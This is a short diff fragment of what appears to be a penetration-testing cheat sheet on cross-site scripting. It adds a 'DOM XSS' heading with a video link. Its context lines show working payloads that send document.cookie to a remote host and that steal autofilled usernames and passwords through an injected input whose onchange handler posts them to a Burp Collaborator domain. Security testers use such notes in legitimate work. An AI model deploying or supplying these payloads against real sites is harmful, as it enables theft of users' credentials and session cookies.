@@ -45,3 +45,6 @@ method:"POST","mode": "no-cors", body:document.cookie,
  - steal password autofill <input name=user id=user>
 <input name=pass id=pass 
 onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.burpcollaborator.net', {method: 'POST', mode:'no-cors',body: user.value+' '+this.value}),">
+
+# DOM XSS
+ - https://youtu.be/5OiWO5Qr-iI
